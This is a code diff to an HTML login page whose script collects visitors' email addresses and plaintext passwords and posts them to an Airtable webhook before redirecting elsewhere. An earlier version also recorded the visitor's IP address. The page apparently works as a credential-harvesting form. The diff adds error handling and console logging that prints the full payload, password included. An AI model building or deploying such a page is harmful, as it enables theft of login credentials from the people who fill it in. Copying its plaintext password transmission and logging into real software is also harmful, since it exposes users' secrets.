@@ -70,23 +70,44 @@
       font-size: 14px;
       margin-top: 5px;
     }
-    .success-message {
-      display: none;
-      background-color: #d4edda;
-      color: #155724;
+    .message {
       padding: 10px;
       border-radius: 4px;
       margin-bottom: 15px;
       text-align: center;
+    }
+    .success-message {
+      display: none;
+      background-color: #d4edda;
+      color: #155724;
+    }
+    .error-message {
+      display: none;
+      background-color: #f8d7da;
+      color: #721c24;
+    }
+    #responseDetails {
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #f8f9fa;
+      border-radius: 4px;
+      font-size: 12px;
+      white-space: pre-wrap;
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="form-container">
     <h1>Login</h1>
-    <div id="successMessage" class="success-message">
+    <div id="successMessage" class="message success-message">
       Form submitted successfully! Redirecting...
     </div>
+    <div id="errorMessage" class="message error-message">
+      Error submitting form. Please try again.
+    </div>
+    <div id="responseDetails"></div>
+    
     <form id="loginForm">
       <div class="form-group">
         <label for="email">Email:</label>
@@ -109,6 +130,8 @@
       const form = document.getElementById('loginForm');
       const submitButton = document.getElementById('submitButton');
       const successMessage = document.getElementById('successMessage');
+      const errorMessage = document.getElementById('errorMessage');
+      const responseDetails = document.getElementById('responseDetails');
       
       // Your Airtable webhook URL
       const WEBHOOK_URL = 'https://hooks.airtable.com/workflows/v1/genericWebhook/appWWw92Q29J21BO3/wfl77Xdfu9VtRuaiw/wtrD1pawC12AniDFG';
@@ -116,8 +139,27 @@
       // The URL to redirect to after form submission
       const REDIRECT_URL = 'https://example.com/dashboard'; // Change this to your desired redirect URL
       
+      // Function to show error with details
+      function showError(message, details) {
+        errorMessage.textContent = message;
+        errorMessage.style.display = 'block';
+        
+        if (details) {
+          responseDetails.textContent = details;
+          responseDetails.style.display = 'block';
+        }
+        
+        submitButton.disabled = false;
+        submitButton.textContent = 'Submit';
+      }
+      
       form.addEventListener('submit', async function(event) {
         event.preventDefault();
+        
+        // Reset messages
+        successMessage.style.display = 'none';
+        errorMessage.style.display = 'none';
+        responseDetails.style.display = 'none';
         
         // Clear previous errors
         document.querySelectorAll('.error').forEach(el => el.textContent = '');
@@ -144,18 +186,14 @@
         submitButton.textContent = 'Processing...';
         
         try {
-          // Get IP address using a public API
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipResponse.json();
-          const ip = ipData.ip;
-          
           // Prepare data for Airtable webhook
           const payload = {
             email: email,
             password: password,
-            ip: ip,
             timestamp: new Date().toISOString()
           };
+          
+          console.log("Sending payload to webhook:", payload);
           
           // Send data to Airtable webhook
           const response = await fetch(WEBHOOK_URL, {
@@ -166,8 +204,12 @@
             body: JSON.stringify(payload)
           });
           
+          const responseText = await response.text();
+          console.log("Response status:", response.status);
+          console.log("Response text:", responseText);
+          
           if (!response.ok) {
-            throw new Error('Failed to submit to Airtable');
+            throw new Error(`Failed to submit to Airtable: ${response.status} ${responseText}`);
           }
           
           // Show success message
@@ -180,11 +222,7 @@
           
         } catch (error) {
           console.error('Form submission error:', error);
-          alert('There was an error processing your request. Please try again later.');
-          
-          // Re-enable submit button
-          submitButton.disabled = false;
-          submitButton.textContent = 'Submit';
+          showError('There was an error processing your request.', error.toString());
         }
       });
     });
